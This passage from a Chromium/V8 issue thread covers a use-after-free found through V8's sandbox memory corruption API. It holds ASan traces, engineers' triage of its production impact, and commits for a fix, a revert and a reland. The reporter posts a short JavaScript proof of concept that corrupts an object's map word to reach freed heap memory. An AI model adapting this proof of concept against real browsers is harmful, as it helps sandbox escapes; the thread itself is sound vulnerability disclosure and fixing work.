  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==21830==ABORTING

## V8 sandbox violation detected!

```

### cl...@appspot.gserviceaccount.com (2025-06-25)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5231837903257600.

### da...@hirsch.cx (2025-06-25)

It seems like ClusterFuzz was not able to reproduce this issue because the memory corruption API was not enabled.

Please also find the following stack trace from a properly symbolized build:

```
[COV] no shared memory bitmap available, skipping
[COV] edge counters initialized. Shared memory: (null) with 1595718 edges
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
=================================================================
==232318==ERROR: AddressSanitizer: heap-use-after-free on address 0x757b12b40240 at pc 0x57c9a46e9e8c bp 0x726addaab6c0 sp 0x726addaab6b8
READ of size 4 at 0x757b12b40240 thread T45 (V8 DefaultWorke)
    #0 0x57c9a46e9e8b in v8::internal::Heap::HeapState std::__Cr::__cxx_atomic_load<v8::internal::Heap::HeapState>(std::__Cr::__cxx_atomic_base_impl<v8::internal::Heap::HeapState> const*, std::__Cr::memory_order) third_party/libc++/src/include/__atomic/support/c11.h:81:10
    #1 0x57c9a46e9e8b in std::__Cr::__atomic_base<v8::internal::Heap::HeapState, false>::load(std::__Cr::memory_order) const third_party/libc++/src/include/__atomic/atomic.h:70:12
    #2 0x57c9a46e9e8b in v8::internal::Heap::gc_state() const v8/src/heap/heap.h:567:22
    #3 0x57c9a46e9e8b in v8::internal::HeapLayout::CheckYoungGenerationConsistency(v8::internal::MemoryChunk const*) v8/src/heap/heap-layout.cc:36:3
    #4 0x57c9a4cafa59 in v8::internal::HeapLayout::InYoungGeneration(v8::internal::MemoryChunk const*, v8::internal::Tagged<v8::internal::HeapObject>) v8/src/heap/heap-layout-inl.h:36:5
    #5 0x57c9a4cafa59 in v8::internal::HeapLayout::InYoungGeneration(v8::internal::Tagged<v8::internal::HeapObject>) v8/src/heap/heap-layout-inl.h:58:10
    #6 0x57c9a4cafa59 in heap::base::SlotCallbackResult v8::internal::Scavenger::ScavengeObject<v8::internal::CompressedHeapObjectSlot>(v8::internal::CompressedHeapObjectSlot, v8::internal::Tagged<v8::internal::HeapObject>) v8/src/heap/scavenger-inl.h:399:5
    #7 0x57c9a4d66ed2 in void v8::internal::ScavengeVisitor::VisitHeapObjectImpl<v8::internal::CompressedObjectSlot>(v8::internal::CompressedObjectSlot, v8::internal::Tagged<v8::internal::HeapObject>) v8/src/heap/scavenger-inl.h:506:17
    #8 0x57c9a4d66ed2 in void v8::internal::ScavengeVisitor::VisitPointersImpl<v8::internal::CompressedObjectSlot>(v8::internal::Tagged<v8::internal::HeapObject>, v8::internal::CompressedObjectSlot, v8::internal::CompressedObjectSlot) v8/src/heap/scavenger-inl.h:523:7
    #9 0x57c9a4d40ee4 in v8::internal::ScavengeVisitor::VisitPointers(v8::internal::Tagged<v8::internal::HeapObject>, v8::internal::CompressedObjectSlot, v8::internal::CompressedObjectSlot) v8/src/heap/scavenger-inl.h:492:10
    #10 0x57c9a4d40ee4 in void v8::internal::BodyDescriptorBase::IteratePointers<v8::internal::ScavengeVisitor>(v8::internal::Tagged<v8::internal::HeapObject>, int, int, v8::internal::ScavengeVisitor*) v8/src/objects/objects-body-descriptors-inl.h:216:6
    #11 0x57c9a4d40ee4 in void v8::internal::SuffixRangeBodyDescriptor<4>::IterateBody<v8::internal::ScavengeVisitor>(v8::internal::Tagged<v8::internal::Map>, v8::internal::Tagged<v8::internal::HeapObject>, int, v8::internal::ScavengeVisitor*) v8/src/objects/objects-body-descriptors.h:172:5
    #12 0x57c9a4d40ee4 in unsigned long v8::internal::HeapVisitor<v8::internal::ScavengeVisitor>::VisitWithBodyDescriptor<(v8::internal::VisitorId)106, v8::internal::Context, v8::internal::Context::BodyDescriptor>(v8::internal::Tagged<v8::internal::Map>, v8::internal::Tagged<v8::internal::Context>, v8::internal::MaybeObjectSize) v8/src/heap/heap-visitor-inl.h:392:3
    #13 0x57c9a4c8c470 in v8::internal::HeapVisitor<v8::internal::ScavengeVisitor>::Visit(v8::internal::Tagged<v8::internal::Map>, v8::internal::Tagged<v8::internal::HeapObject>) requires !T::UsePrecomputedObjectSize() v8/src/heap/heap-visitor-inl.h:105:10
    #14 0x57c9a4c8c470 in v8::internal::HeapVisitor<v8::internal::ScavengeVisitor>::Visit(v8::internal::Tagged<v8::internal::HeapObject>) requires !T::UsePrecomputedObjectSize() v8/src/heap/heap-visitor-inl.h:97:10
    #15 0x57c9a4c8c470 in v8::internal::Scavenger::Process(v8::JobDelegate*) v8/src/heap/scavenger.cc:1271:24
    #16 0x57c9a4c8b58c in v8::internal::ScavengerCollector::JobTask::ProcessItems(v8::JobDelegate*, v8::internal::Scavenger*) v8/src/heap/scavenger.cc:274:16
    #17 0x57c9a4c8ac5a in v8::internal::ScavengerCollector::JobTask::Run(v8::JobDelegate*) v8/src/heap/scavenger.cc:247:5
    #18 0x57c9a3b13148 in v8::platform::DefaultJobWorker::Run() v8/src/libplatform/default-job.h:147:18
    #19 0x57c9a3b2ad24 in v8::platform::DefaultWorkerThreadsTaskRunner::WorkerThread::Run() v8/src/libplatform/default-worker-threads-task-runner.cc:95:25
    #20 0x57c9a3b05952 in v8::base::Thread::NotifyStartedAndRun() v8/src/base/platform/platform.h:627:5
    #21 0x57c9a3b05952 in v8::base::ThreadEntry(void*) v8/src/base/platform/platform-posix.cc:1229:11
    #22 0x57c9a3142f86 in asan_thread_start(void*) /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors.cpp:239:28

0x757b12b40240 is located 62016 bytes inside of 70400-byte region [0x757b12b31000,0x757b12b42300)
freed by thread T47 (WorkerThread) here:
    #0 0x57c9a3145396 in free /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_malloc_linux.cpp:51:3
    #1 0x57c9a3201ba6 in v8::Worker::ExecuteInThread() v8/src/d8/d8.cc:5522:13
    #2 0x57c9a320077c in v8::Worker::WorkerThread::Run() v8/src/d8/d8.cc:5226:11
    #3 0x57c9a3b05952 in v8::base::Thread::NotifyStartedAndRun() v8/src/base/platform/platform.h:627:5
    #4 0x57c9a3b05952 in v8::base::ThreadEntry(void*) v8/src/base/platform/platform-posix.cc:1229:11
    #5 0x57c9a3142f86 in asan_thread_start(void*) /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors.cpp:239:28

previously allocated by thread T47 (WorkerThread) here:
    #0 0x57c9a31460f7 in posix_memalign /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_malloc_linux.cpp:139:3
    #1 0x57c9a44347ca in v8::base::AlignedAlloc(unsigned long, unsigned long) v8/src/base/platform/memory.h:97:7
    #2 0x57c9a44347ca in v8::internal::Isolate::Allocate(v8::internal::IsolateGroup*) v8/src/execution/isolate.cc:4173:23
    #3 0x57c9a44347ca in v8::internal::Isolate::New(v8::internal::IsolateGroup*) v8/src/execution/isolate.cc:4166:53
    #4 0x57c9a3bc73cf in v8::Isolate::Allocate(v8::IsolateGroup const&) v8/src/api/api.cc:9941:37
    #5 0x57c9a3bc73cf in v8::Isolate::New(v8::IsolateGroup const&, v8::Isolate::CreateParams const&) v8/src/api/api.cc:10065:25
    #6 0x57c9a3bc73cf in v8::Isolate::New(v8::Isolate::CreateParams const&) v8/src/api/api.cc:10060:10
    #7 0x57c9a3200a0e in v8::Worker::ExecuteInThread() v8/src/d8/d8.cc:5395:14
    #8 0x57c9a320077c in v8::Worker::WorkerThread::Run() v8/src/d8/d8.cc:5226:11
    #9 0x57c9a3b05952 in v8::base::Thread::NotifyStartedAndRun() v8/src/base/platform/platform.h:627:5
    #10 0x57c9a3b05952 in v8::base::ThreadEntry(void*) v8/src/base/platform/platform-posix.cc:1229:11
    #11 0x57c9a3142f86 in asan_thread_start(void*) /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors.cpp:239:28

Thread T45 (V8 DefaultWorke) created by T0 here:
    #0 0x57c9a3129871 in pthread_create /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors.cpp:250:3
    #1 0x57c9a3b05681 in v8::base::Thread::Start() v8/src/base/platform/platform-posix.cc:1261:14
    #2 0x57c9a3b29bb5 in v8::platform::DefaultWorkerThreadsTaskRunner::WorkerThread::WorkerThread(v8::platform::DefaultWorkerThreadsTaskRunner*, v8::base::Thread::Priority) v8/src/libplatform/default-worker-threads-task-runner.cc:80:3
    #3 0x57c9a3b29bb5 in std::__Cr::unique_ptr<v8::platform::DefaultWorkerThreadsTaskRunner::WorkerThread, std::__Cr::default_delete<v8::platform::DefaultWorkerThreadsTaskRunner::WorkerThread>> std::__Cr::make_unique<v8::platform::DefaultWorkerThreadsTaskRunner::WorkerThread, v8::platform::DefaultWorkerThreadsTaskRunner*, v8::base::Thread::Priority&, 0>(v8::platform::DefaultWorkerThreadsTaskRunner*&&, v8::base::Thread::Priority&) third_party/libc++/src/include/__memory/unique_ptr.h:759:30
    #4 0x57c9a3b29bb5 in v8::platform::DefaultWorkerThreadsTaskRunner::DefaultWorkerThreadsTaskRunner(unsigned int, double (*)(), v8::base::Thread::Priority) v8/src/libplatform/default-worker-threads-task-runner.cc:18:28
    #5 0x57c9a3b09021 in v8::platform::DefaultWorkerThreadsTaskRunner* std::__Cr::construct_at<v8::platform::DefaultWorkerThreadsTaskRunner, int const&, double (*)(), v8::base::Thread::Priority, v8::platform::DefaultWorkerThreadsTaskRunner*>(v8::platform::DefaultWorkerThreadsTaskRunner*, int const&, double (*&&)(), v8::base::Thread::Priority&&) third_party/libc++/src/include/__memory/construct_at.h:40:49
    #6 0x57c9a3b09021 in v8::platform::DefaultWorkerThreadsTaskRunner* std::__Cr::__construct_at<v8::platform::DefaultWorkerThreadsTaskRunner, int const&, double (*)(), v8::base::Thread::Priority, v8::platform::DefaultWorkerThreadsTaskRunner*>(v8::platform::DefaultWorkerThreadsTaskRunner*, int const&, double (*&&)(), v8::base::Thread::Priority&&) third_party/libc++/src/include/__memory/construct_at.h:48:10
    #7 0x57c9a3b09021 in void std::__Cr::allocator_traits<std::__Cr::allocator<v8::platform::DefaultWorkerThreadsTaskRunner>>::construct<v8::platform::DefaultWorkerThreadsTaskRunner, int const&, double (*)(), v8::base::Thread::Priority, 0>(std::__Cr::allocator<v8::platform::DefaultWorkerThreadsTaskRunner>&, v8::platform::DefaultWorkerThreadsTaskRunner*, int const&, double (*&&)(), v8::base::Thread::Priority&&) third_party/libc++/src/include/__memory/allocator_traits.h:302:5
    #8 0x57c9a3b09021 in std::__Cr::__shared_ptr_emplace<v8::platform::DefaultWorkerThreadsTaskRunner, std::__Cr::allocator<v8::platform::DefaultWorkerThreadsTaskRunner>>::__shared_ptr_emplace<int const&, double (*)(), v8::base::Thread::Priority, std::__Cr::allocator<v8::platform::DefaultWorkerThreadsTaskRunner>, 0>(std::__Cr::allocator<v8::platform::DefaultWorkerThreadsTaskRunner>, int const&, double (*&&)(), v8::base::Thread::Priority&&) third_party/libc++/src/include/__memory/shared_ptr.h:162:5
    #9 0x57c9a3b09021 in std::__Cr::shared_ptr<v8::platform::DefaultWorkerThreadsTaskRunner> std::__Cr::allocate_shared<v8::platform::DefaultWorkerThreadsTaskRunner, std::__Cr::allocator<v8::platform::DefaultWorkerThreadsTaskRunner>, int const&, double (*)(), v8::base::Thread::Priority, 0>(std::__Cr::allocator<v8::platform::DefaultWorkerThreadsTaskRunner> const&, int const&, double (*&&)(), v8::base::Thread::Priority&&) third_party/libc++/src/include/__memory/shared_ptr.h:736:51
    #10 0x57c9a3b09021 in std::__Cr::shared_ptr<v8::platform::DefaultWorkerThreadsTaskRunner> std::__Cr::make_shared<v8::platform::DefaultWorkerThreadsTaskRunner, int const&, double (*)(), v8::base::Thread::Priority, 0>(int const&, double (*&&)(), v8::base::Thread::Priority&&) third_party/libc++/src/include/__memory/shared_ptr.h:744:10
    #11 0x57c9a3b09021 in v8::platform::DefaultPlatform::EnsureBackgroundTaskRunnerInitialized() v8/src/libplatform/default-platform.cc:141:9
    #12 0x57c9a3b077c5 in std::__Cr::unique_ptr<v8::platform::DefaultPlatform, std::__Cr::default_delete<v8::platform::DefaultPlatform>> std::__Cr::make_unique<v8::platform::DefaultPlatform, int&, v8::platform::IdleTaskSupport&, std::__Cr::unique_ptr<v8::TracingController, std::__Cr::default_delete<v8::TracingController>>, v8::platform::PriorityMode&, 0>(int&, v8::platform::IdleTaskSupport&, std::__Cr::unique_ptr<v8::TracingController, std::__Cr::default_delete<v8::TracingController>>&&, v8::platform::PriorityMode&) third_party/libc++/src/include/__memory/unique_ptr.h:759:30
    #13 0x57c9a3b077c5 in v8::platform::NewDefaultPlatform(int, v8::platform::IdleTaskSupport, v8::platform::InProcessStackDumping, std::__Cr::unique_ptr<v8::TracingController, std::__Cr::default_delete<v8::TracingController>>, v8::platform::PriorityMode) v8/src/libplatform/default-platform.cc:54:19
    #14 0x57c9a320c61b in v8::Shell::Main(int, char**) v8/src/d8/d8.cc:6582:18
    #15 0x766b1360d249  (/lib/x86_64-linux-gnu/libc.so.6+0x27249) (BuildId: 79005c16293efa45b441fed45f4f29b138557e9e)

Thread T47 (WorkerThread) created by T0 here:
    #0 0x57c9a3129871 in pthread_create /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors.cpp:250:3
    #1 0x57c9a3b05681 in v8::base::Thread::Start() v8/src/base/platform/platform-posix.cc:1261:14
    #2 0x57c9a31ecdd7 in v8::Worker::StartWorkerThread(v8::Isolate*, std::__Cr::shared_ptr<v8::Worker>, v8::base::Thread::Priority) v8/src/d8/d8.cc:5210:16
    #3 0x57c9a31ec35b in v8::Shell::WorkerNew(v8::FunctionCallbackInfo<v8::Value> const&) v8/src/d8/d8.cc:3345:10
    #4 0x57c9a3c8caa1 in v8::internal::FunctionCallbackArguments::CallOrConstruct(v8::internal::Tagged<v8::internal::FunctionTemplateInfo>, bool) v8/src/api/api-arguments-inl.h:93:3
    #5 0x57c9a3c8843e in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<true>(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::HeapObject>, v8::internal::DirectHandle<v8::internal::FunctionTemplateInfo>, v8::internal::DirectHandle<v8::internal::Object>, unsigned long*, int) v8/src/builtins/builtins-api.cc:104:16
    #6 0x57c9a3c85195 in v8::internal::Builtin_Impl_HandleApiConstruct(v8::internal::BuiltinArguments, v8::internal::Isolate*) v8/src/builtins/builtins-api.cc:135:3
    #7 0x57c9a3c84117 in v8::internal::Builtin_HandleApiConstruct(int, unsigned long*, v8::internal::Isolate*) v8/src/builtins/builtins-api.cc:126:1
    #8 0x57c9aae469bc in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc
    #9 0x57c9aad0d381 in Builtins_InterpreterPushArgsThenFastConstructFunction setup-isolate-deserialize.cc
    #10 0x57c9ab0346bc in Builtins_ConstructHandler setup-isolate-deserialize.cc
    #11 0x57c9aad0c862 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #12 0x57c9aad0c862 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #13 0x57c9aad07ce6 in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #14 0x57c9aad07a2a in Builtins_JSEntry setup-isolate-deserialize.cc
    #15 0x57c9a43aa0c2 in v8::internal::GeneratedCode<unsigned long, unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**>::Call(unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**) v8/src/execution/simulator.h:212:12
    #16 0x57c9a43aa0c2 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution/execution.cc:442:22
    #17 0x57c9a43ae229 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) v8/src/execution/execution.cc:542:10
    #18 0x57c9a3b49578 in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) v8/src/api/api.cc:1965:7
    #19 0x57c9a31c3b61 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) v8/src/d8/d8.cc:1028:44
    #20 0x57c9a31fd545 in v8::SourceGroup::Execute(v8::Isolate*) v8/src/d8/d8.cc:5077:10
    #21 0x57c9a320a631 in v8::Shell::RunMainIsolate(v8::Isolate*, bool) v8/src/d8/d8.cc:6029:37
    #22 0x57c9a320963e in v8::Shell::RunMain(v8::Isolate*, bool) v8/src/d8/d8.cc:5937:18
    #23 0x57c9a320dca8 in v8::Shell::Main(int, char**) v8/src/d8/d8.cc:6803:18
    #24 0x766b1360d249  (/lib/x86_64-linux-gnu/libc.so.6+0x27249) (BuildId: 79005c16293efa45b441fed45f4f29b138557e9e)

SUMMARY: AddressSanitizer: heap-use-after-free third_party/libc++/src/include/__atomic/support/c11.h:81:10 in v8::internal::Heap::HeapState std::__Cr::__cxx_atomic_load<v8::internal::Heap::HeapState>(std::__Cr::__cxx_atomic_base_impl<v8::internal::Heap::HeapState> const*, std::__Cr::memory_order)
Shadow bytes around the buggy address:
  0x757b12b3ff80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x757b12b40000: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x757b12b40080: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x757b12b40100: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x757b12b40180: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x757b12b40200: fd fd fd fd fd fd fd fd[fd]fd fd fd fd fd fd fd
  0x757b12b40280: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x757b12b40300: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x757b12b40380: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x757b12b40400: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x757b12b40480: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==232318==ABORTING

## V8 sandbox violation detected!

```

Based on this, the UAF happens in `v8::internal::Heap::gc_state` which is called from  `v8::internal::HeapLayout::CheckYoungGenerationConsistency`.
Currently, this only reproduces with DCHECKs enabled, as the UAF seems to occur in a DCHECK in `v8::internal::HeapLayout::CheckYoungGenerationConsistency`:

```
  DCHECK_IMPLIES(heap->gc_state() == Heap::NOT_IN_GC,
                 chunk->IsFlagSet(MemoryChunk::TO_PAGE));

```

It could be possible to trigger a call to `heap->gc_state()` otherwise, but I did not manage to accomplish that yet.

### ca...@chromium.org (2025-06-26)

Trying CF again with the memory corruption api enabled

### cl...@appspot.gserviceaccount.com (2025-06-26)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6022351867019264.

### ca...@chromium.org (2025-06-26)

CF was still not able to reproduce this, provisionaly triaging as a valid V8 sandbox bypass, passing to V8 sheriff for further triage

### cf...@google.com (2025-06-27)

mlippautz@ could you PTAL?  

If this can only be triggered in DCHECK-enabled builds we might consider downgrading this to type bug as there is no impact on production builds.

### ml...@chromium.org (2025-06-27)

Over to current memory gardener for inspection.

### ni...@chromium.org (2025-06-27)

Execution of this POC program does the following:

1. Some worker is created and executes, creating its isolate and heap. The heap contains some chunk C.
2. The worker terminates; its isolate and heap are destroyed.
3. In some other isolate and heap, an object X is created.
4. The memory corruption API is used, setting the map word of X to some random value.
5. This value is such that the scavenger will later interpret it as a forwarding address, pointing somewhere inside chunk C.
6. A scavenge is triggered.
7. When the scavenger reaches object X, it thinks that the object has already been scavenged and that it has a valid forwarding address.
8. This `DCHECK` [1](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/heap/scavenger-inl.h;drc=c04c7e810667f46a4a38c743ecf90290e2d88890;l=404) tests that the pointed object is in the young generation.
9. `HeapLayout::InYoungGeneration` (regardless of the consistency check which is particular to debug buidlds) accesses chunk C, which has been freed.

Although this behaviour is particular to a DCHECK-enabled build, a few lines below [2](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/heap/scavenger-inl.h;drc=c04c7e810667f46a4a38c743ecf90290e2d88890;l=411) the chunk would be accessed in production builds.  

This access however would only read the chunk's "young generation" flag and use it to decide whether to keep or remove the slot.  

I am not certain whether this could be a vulnerability but I'd be very surprised if somebody could exploit this.

I am cc:ing Omer as a scavenger expert.

### om...@chromium.org (2025-06-27)

Thanks Nikos.

Is it important that C used to be allocated by another worker? I assume that any fake map word that looks like a forwarding pointer would trigger this, regardless of whether C was allocated and freed by the same isolate or another, or whether it was even ever allocated at all, right?

Regardless of the DCHECKs, my understanding is that in a production build we could be left with objects pointing to dead memory.
I'm not sure how to make a sandbox escape out of it given that the corrupted map word points into the cage.
Carl, wdyt?

### da...@hirsch.cx (2025-06-27)

Thanks for investigating!

> Regardless of the DCHECKs, my understanding is that in a production build we could be left with objects pointing to dead memory.
> I'm not sure how to make a sandbox escape out of it given that the corrupted map word points into the cage.

If I understand this correctly, the dangling pointer itself is already located outside of the sandbox.

Consider the following program:

```
function f8() {
    function f24(a) {
        ; // eval();
    }
    const v34 = new BigUint64Array(2157);
    const v35 = new Float64Array();
    console.log(Sandbox.getAddressOf(v35).toString(16))
    for (const v36 of v34) {
        const v43 = new DataView(new Sandbox.MemoryView(0, 0x100000000));
        v43.setInt16(Sandbox.getAddressOf(v35), 0x01);
    }
    new Worker(f24, { type: "function" });
}

console.log(Sandbox.base.toString(16), (Sandbox.base + Sandbox.byteLength).toString(16))
f8();
f8();
f8();

```

which will give the following output:

```
[COV] no shared memory bitmap available, skipping
[COV] edge counters initialized. Shared memory: (null) with 1595718 edges
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
7e8c00000000 7f8c00000000
18d310
1df978
271ed8
=================================================================
==6824==ERROR: AddressSanitizer: heap-use-after-free on address 0x761f2be40240 at pc 0x58f8106bee8c bp 0x7ffe5c5d3a10 sp 0x7ffe5c5d3a08
READ of size 4 at 0x761f2be40240 thread T0
SCARINESS: 45 (4-byte-read-heap-use-after-free)
/* [...] */
## V8 sandbox violation detected!

```

In this case, the sandbox base is located at `0x7e8c00000000` and the accessed dangling pointer is located at `0x7744d3440240`, well below the sandbox base. Did I miss something?

### ml...@chromium.org (2025-06-27)

This looks like the `MemoryChunkMetadata` points to a `Heap` that is already gone which then is the UAF that ASAN detects.

The UAF happens because we pool the page which does not delete the `MemoryChunkMetadata` object. We only re-initialize from it here [1](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/heap/memory-allocator.cc;l=410;drc=d350ca68909171a740a8e33c43fea86ed0574a05;bpv=1;bpt=1). We can improve that by either wiping out full pointers or freeing the entry which would lead to a null crash on getting the `MemoryChunkMetadata`.

Samuel: This particular repro relies on `CheckYoungGenerationConsistency()` which is only there in debug modes. I don't think the repro is a bypass in production releases. Can you clarify which gn args should be used?

### sa...@chromium.org (2025-06-30)

Yes if this issue only exists in debug builds and doesn't affect production/shipping builds then we wouldn't treat it as a vulnerability. From [comment #10](https://issues.chromium.org/issues/427662337#comment10) it sounds like we might also access the freed object in a production build though? Then it'd be a vulnerability. But if you're confident that that cannot happen, then please downgrade to Type-Bug and change the severity accordingly.

### ml...@chromium.org (2025-06-30)

I cannot see that: `HeapLayout::InYoungGeneration()` accesses the `MemoryChunk` via flags which is safe, even on a UAFed chunk.

In general, there's still a problem with `MemoryChunkMetadata::heap()` accessor as there's call sites that are non-DEBUG. I don't think we have a POC here though.

### ni...@chromium.org (2025-06-30)

@David, we're not questioning whether your repro makes an access outside the sandbox in debug builds --- it definitely does.  

We're discussing whether this could happen also in production builds, which would make it a vulnerability.

@Samuel, as I wrote in [comment #10](https://issues.chromium.org/issues/427662337#comment10), in production builds `HeapLayout::InYoungGeneration()` would still be accessed.  

However, as Michael writes in [comment #15](https://issues.chromium.org/issues/427662337#comment15), in production builds this will only access the chunk's flags.  

Only in debug builds can we end up in `HeapLayout::CheckYoungGenerationConsistency`, which accesses the deleted heap (which is out of the sandbox).

After all this, I believe that this particular path, where a forwarding address is abused, is not a vulnerability.

However, there may be other cases where we have a page that is not used anymore and its metadata still points to a deallocated heap.  

In such cases, `metadata->heap()` would cause a sandbox escape.  

We don't have a concrete example where this happens, or even less an exploit, but in general this is a possible vulnerability and needs to be fixed.

### dx...@google.com (2025-06-30)

Project: v8/v8  

Branch: main  

Author: Omer Katz [omerkatz@chromium.org](mailto:omerkatz@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6688492>

[heap] Clear chunk metadata table entry on pooling

---


Expand for full commit details
```
     
    Trying to access the metadata of a pooled chunk will find a nullptr as 
    the table entry and will crash with null dereference. The metadata 
    pointer is reset when the pooled page is allocated again. 
     
    Bug: 427662337 
    Change-Id: I44154998ea9b93e12a95040f9d0dafdb74874794 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6688492 
    Reviewed-by: Michael Lippautz <mlippautz@chromium.org> 
    Commit-Queue: Omer Katz <omerkatz@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#101131}

```

---

Files:

- M `src/heap/memory-chunk.cc`
- M `src/heap/memory-chunk.h`
- M `src/heap/memory-pool.cc`

---

Hash: 76eb709030d633c65f590d785a23d0c575fc7772  

Date:  Mon Jun 30 11:36:36 2025


---

### ml...@chromium.org (2025-06-30)

Summarizing offline discussions: It seems the particular POC only works for debug builds. That said, it highlights a broader issue for which we'd need to investigate all callers of e.g. `MemoryChunkMetadata::heap()`. We are not entirely confident that it cannot be triggered otherwise, so we will leave this as type Vulnerability.

The fix in [comment #17](https://issues.chromium.org/issues/427662337#comment17) addresses the problem in general though.

### dx...@google.com (2025-06-30)

Project: v8/v8  

Branch: main  

Author: Matthias Liedtke [mliedtke@chromium.org](mailto:mliedtke@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6686294>

Revert "[heap] Clear chunk metadata table entry on pooling"

---


Expand for full commit details
```
     
    This reverts commit 76eb709030d633c65f590d785a23d0c575fc7772. 
     
    Reason for revert: Fails on mksnapshot on TSAN debug: 
    https://ci.chromium.org/ui/p/v8/builders/ci/V8%20Linux64%20TSAN%20-%20debug%20builder/15237/overview 
     
    Bug: 427662337 
    Original change's description: 
    > [heap] Clear chunk metadata table entry on pooling 
    > 
    > Trying to access the metadata of a pooled chunk will find a nullptr as 
    > the table entry and will crash with null dereference. The metadata 
    > pointer is reset when the pooled page is allocated again. 
    > 
    > Bug: 427662337 
    > Change-Id: I44154998ea9b93e12a95040f9d0dafdb74874794 
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6688492 
    > Reviewed-by: Michael Lippautz <mlippautz@chromium.org> 
    > Commit-Queue: Omer Katz <omerkatz@chromium.org> 
    > Cr-Commit-Position: refs/heads/main@{#101131} 
     
    Bug: 427662337 
    Change-Id: I06d7d95e488970f6bec8eb61c5d2ac054686027f 
    No-Presubmit: true 
    No-Tree-Checks: true 
    No-Try: true 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6686294 
    Commit-Queue: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Owners-Override: Matthias Liedtke <mliedtke@chromium.org> 
    Auto-Submit: Matthias Liedtke <mliedtke@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#101133}

```

---

Files:

- M `src/heap/memory-chunk.cc`
- M `src/heap/memory-chunk.h`
- M `src/heap/memory-pool.cc`

---

Hash: 3e621970025dda5ff7f58a06913148a5d98f6072  

Date:  Mon Jun 30 13:44:27 2025


---

### dx...@google.com (2025-06-30)

Project: v8/v8  

Branch: main  

Author: Omer Katz [omerkatz@chromium.org](mailto:omerkatz@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6687412>

Reland "[heap] Clear chunk metadata table entry on pooling"

---


Expand for full commit details
```
     
    This is a reland of commit 76eb709030d633c65f590d785a23d0c575fc7772 
     
    Fixed by moving the `InReadOnlySpace` check to before the metadata 
    pointer is set to nullptr. 
     
    Original change's description: 
    > [heap] Clear chunk metadata table entry on pooling 
    > 
    > Trying to access the metadata of a pooled chunk will find a nullptr as 
    > the table entry and will crash with null dereference. The metadata 
    > pointer is reset when the pooled page is allocated again. 
    > 
    > Bug: 427662337 
    > Change-Id: I44154998ea9b93e12a95040f9d0dafdb74874794 
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6688492 
    > Reviewed-by: Michael Lippautz <mlippautz@chromium.org> 
    > Commit-Queue: Omer Katz <omerkatz@chromium.org> 
    > Cr-Commit-Position: refs/heads/main@{#101131} 
     
    Bug: 427662337 
